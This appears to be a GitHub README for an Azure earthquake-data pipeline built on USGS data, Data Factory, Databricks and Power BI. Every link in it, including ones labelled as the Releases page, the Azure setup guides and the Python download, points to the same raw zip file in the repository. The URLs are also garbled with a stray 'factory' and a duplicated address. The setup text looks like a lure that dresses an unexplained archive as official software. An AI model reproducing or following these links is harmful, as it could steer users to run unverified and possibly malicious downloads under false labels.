## 📋 Overview

Welcome to the Earthquake Data Engineering Pipeline on Azure! This application provides an end-to-end solution for ingesting real-time earthquake data from the USGS API. With this application, you can easily manage and visualize earthquake data using Azure's powerful tools, including Azure Data Factory, Databricks, ADLS Gen2, and Synapse Analytics.

## 🚀 Getting Started

Follow these simple steps to get started:

1. **Download the Application**
   Visit the [Releases page](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip) to download the latest version of the software. 

2. **Set Up Your Environment**
   Ensure your machine meets the following requirements:
   - Operating System: Windows 10 or later, macOS, or a modern Linux distribution
   - Azure Account: Create a free Azure account if you do not have one. You will need access to Azure services.
   - Internet Connection: Required for accessing and retrieving data from the USGS API.

3. **Install the Necessary Tools**
   - **Azure Data Factory**: This tool orchestrates the data pipeline. Follow [this guide](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip) to set it up.
   - **Databricks**: Use Databricks for data processing. Instructions are available [here](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip).
   - **Azure Storage (ADLS Gen2)**: Set up Azure Data Lake Storage Gen2 to store your data. Get started [here](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip).

4. **Download Required Libraries**
   After setting up your environment, you need to install several libraries:
   - Install Python (if you haven't already). Download it from [https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip).
   - Use the following command to install necessary libraries:
     ```
     pip install requests azure-data-factory azure-databricks azure-storage-blob
     ```

## 📥 Download & Install

To download the application, visit the [Releases page](https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip factory https://raw.githubusercontent.com/Uday-hash-bit/Earthquake-Data-Engineering-Pipeline-on-Azure/main/notebooks/Data_on_Engineering_Azure_Earthquake_Pipeline_2.6.zip). Choose the latest version and follow the instructions to install it.

## 📊 Features

- **Real-Time Data Ingestion**: Automatically collect earthquake data using USGS API.
- **Data Orchestration**: Manage your entire pipeline through Azure Data Factory.
- **Scalable Storage**: Store your data securely with Azure Data Lake Storage Gen2.
- **Data Processing**: Use Azure Databricks for big data processing with PySpark.
- **Visualizations**: Create interactive dashboards with Power BI to analyze earthquake data.

## ⚙️ How It Works

1. **Data Collection**: The application fetches real-time earthquake data from the USGS API.
2. **ETL Process**: After collection, Azure Data Factory orchestrates the ETL process to transform and store data in ADLS Gen2.
3. **Data Processing with Databricks**: Use Databricks to clean and analyze data using PySpark.
4. **Reporting**: Generate reports and visualize data using Power BI.

## 🛠️ Usage Instructions

1. **Launching the Pipeline**: 
   - Open Azure Data Factory and run the pipeline. You can choose between a manual execution or a fully automated daily-triggered workflow.
   
2. **Monitoring**: 
   - Use Azure Data Factory's monitoring tools to track the execution of your workflows.

3. **Using Databricks**:
   - Analyze the data using notebooks in Azure Databricks. You can run queries to get insights from the earthquake data.

4. **Accessing Reports**: 
   - Create reports in Power BI connected to your ADLS storage, allowing for easy data visualization.
